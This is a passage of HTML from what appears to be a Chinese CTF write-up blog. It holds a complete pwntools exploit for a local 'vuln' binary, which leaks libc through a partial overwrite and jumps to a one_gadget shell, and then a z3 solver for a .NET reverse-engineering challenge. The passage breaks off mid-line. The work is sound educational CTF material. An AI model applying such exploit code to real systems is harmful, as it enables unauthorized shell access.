punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>p.send (b’\\xc0’) 是因为程序开了 <strong>aslr 保护</strong>（最后三位不变）偏移不变</p>\n<p>可查看 got 表查看 read 函数最后偏移就是 c0 这里没有修改 read 函数 目的就是泄漏</p>\n<p>最后这里用了 one_gadget 工具</p>\n<p><img data-src=\"/images/image-20230130005749259.png\" alt=\"image.png\"></p>\n<p>one_gadget 就是用来去查找动态链接库里 execve (&quot;/bin/sh&quot;, rsp+0x70, environ) 函数的地址的</p>\n<p>因为环境问题若要本地打通自己配置了一下 libc 和 ld …</p>\n<h5 id=\"exp\"><a class=\"markdownIt-Anchor\" href=\"#exp\">#</a> EXP：</h5>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">\"debug\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">.</span>terminal <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"konsole\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"-e\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">\"./vuln\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\">#p = remote()</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./vuln\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">\"./libc-2.31.so\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">#p = remote(\"\",10000)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#gdb.attach(p,\"b* $rebase(0xadf)\")</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'_start'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#['vuln']</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">#反复执行</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-7'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\xc0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">#让后面的 puts 泄露 read 真实地址</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>read_addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b\"\\x00\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>read_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>libc_base<span class=\"token operator\">=</span>read_addr<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"read\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>libc_base<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>one_gadget<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">0xe3b04</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3b01</span><span class=\"token punctuation\">,</span><span class=\"token number\">0xe3afe</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>shell<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>one_gadget<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'one.\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b'-6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b\"name\\n\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>p64<span class=\"token punctuation\">(</span>shell<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token comment\">#libc 版本问题？</span></pre></td></tr></table></figure><h2 id=\"week3\"><a class=\"markdownIt-Anchor\" href=\"#week3\">#</a> WEEK3</h2>\n<p>春节太忙了 week3 题没怎么做 啊哈哈…</p>\n<h3 id=\"re\"><a class=\"markdownIt-Anchor\" href=\"#re\">#</a> RE</h3>\n<h4 id=\"kunmusic\"><a class=\"markdownIt-Anchor\" href=\"#kunmusic\">#</a> kunmusic</h4>\n<p>DLL 放进 DIE 或看附件的 JS 文件得知是一个.NET 程序</p>\n<p>dnspy 打开找到 main 函数</p>\n<p><img data-src=\"/images/image-20230202140851378.png\" alt=\"image.png\"></p>\n<p><img data-src=\"/images/image-20230202192734759.png\" alt=\"image.png\"></p>\n<p>断点 dump 出 data 由 MZ 文件头发现是一个二进制文件 (64 位的 dnspy)</p>\n<p>用 winhex 新建为文件</p>\n<p><img data-src=\"/images/image-20230202193201803.png\" alt=\"image.png\"></p>\n<p>DIE 查看是 .NET 的 DLL 文件</p>\n<p><img data-src=\"/images/image-20230202194330948.png\" alt=\"image.png\"></p>\n<p>再动调 (静态也能看) 发现 dump 出的 dll 有个 music 函数有个巨大的 if 判断 用 z3 解就行了 然后后面有一个数组异或解出的数据就是 flag</p>\n<p><img data-src=\"/images/image-20230202194558459.png\" alt=\"image.png\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>array <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">132</span><span class=\"token punctuation\">,</span><span class=\"token number\">47</span><span class=\"token punctuation\">,</span><span class=\"token number\">180</span><span class=\"token punctuation\">,</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span><span class=\"token number\">216</span><span class=\"token punctuation\">,</span><span class=\"token number\">45</span><span class=\"token punctuation\">,</span><span class=\"token number\">68</span><span class=\"token punctuation\">,</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token number\">39</span><span class=\"token punctuation\">,</span><span class=\"token number\">246</span><span class=\"token punctuation\">,</span><span class=\"token number\">124</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span><span class=\"token number\">243</span><span class=\"token punctuation\">,</span><span class=\"token number\">137</span><span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span><span class=\"token number\">172</span><span class=\"token punctuation\">,</span><span class=\"token number\">53</span><span class=\"token punctuation\">,</span><span class=\"token number\">200</span><span class=\"token punctuation\">,</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">91</span><span class=\"token punctuation\">,</span><span class=\"token number\">83</span><span class=\"token punctuation\">,</span><span class=\"token number\">13</span><span class=\"token punctuation\">,</span><span class=\"token number\">171</span><span class=\"token punctuation\">,</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span><span class=\"token number\">108</span><span class=\"token punctuation\">,</span><span class=\"token number\">235</span><span class=\"token punctuation\">,</span><span class=\"token number\">179</span><span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span><span class=\"token number\">176</span><span class=\"token punctuation\">,</span><span class=\"token number\">28</span><span class=\"token punctuation\">,</span><span class=\"token number\">216</span><span class=\"token punctuation\">,</span><span class=\"token number\">36</span><span class=\"token punctuation\">,</span><span class=\"token number\">11</span><span class=\"token punctuation\">,</span><span class=\"token number\">80</span><span class=\"token punctuation\">,</span><span class=\"token number\">39</span><span class=\"token punctuation\">,</span><span class=\"token number\">162</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">58</span><span class=\"token punctuation\">,</span><span class=\"token number\">236</span><span class=\"token punctuation\">,</span><span class=\"token number\">130</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span><span class=\"token number\">176</span><span class=\"token punctuation\">,</span><span class=\"token number\">24</span><span class=\"token punctuation\">,</span><span class=\"token number\">212</span><span class=\"token punctuation\">,</span><span class=\"token number\">56</span><span class=\"token punctuation\">,</span><span class=\"token number\">89</span><span class=\"token punctuation\">,</span><span class=\"token number\">72</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'x%d'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>  <span class=\"token comment\"># 初始化序列</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 创建约束求解器</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">52296</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">26211</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">11754</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">41236</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">63747</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">52714</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10512</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">12972</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">45505</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">21713</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">59122</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12840</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21087</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">12702282</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">25228</span> <span class=\"token operator\">+</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">20699</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">8158</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">65307</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30701</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">47555</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">2557</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">49055</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">7992</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">57465</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">57426</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">13299</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">50966</span> <span class=\"token operator\">==</span> <span class=\"token number\">9946829</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">64801</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">60698</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>      <span class=\"token number\">40853</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">54907</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">29882</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">13574</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">21310</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>      <span class=\"token number\">47366</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">41784</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">53690</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">58436</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15590</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>      <span class=\"token number\">58225</span> <span class=\"token operator\">==</span> <span class=\"token number\">2372055</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">61538</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">17121</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">58124</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">8186</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">21253</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">38524</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">48323</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">20556</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">56056</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">18568</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">12995</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">39260</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">25329</span> <span class=\"token operator\">==</span> <span class=\"token number\">6732474</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>      <span class=\"token number\">42567</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">17743</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">47827</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10246</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">16284</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">39390</span> <span class=\"token operator\">+</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">11803</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">60332</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">18491</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">4795</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">25636</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token number\">16780</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">62345</span> <span class=\"token operator\">==</span> <span class=\"token number\">14020739</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">10968</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">31780</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">31857</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>      <span class=\"token number\">61983</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">31048</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">20189</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">12337</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">25945</span> <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">^</span> <span class=\"token number\">7064</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>      <span class=\"token number\">25369</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">54893</span> <span class=\"token operator\">+</span> num<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">59949</span> <span 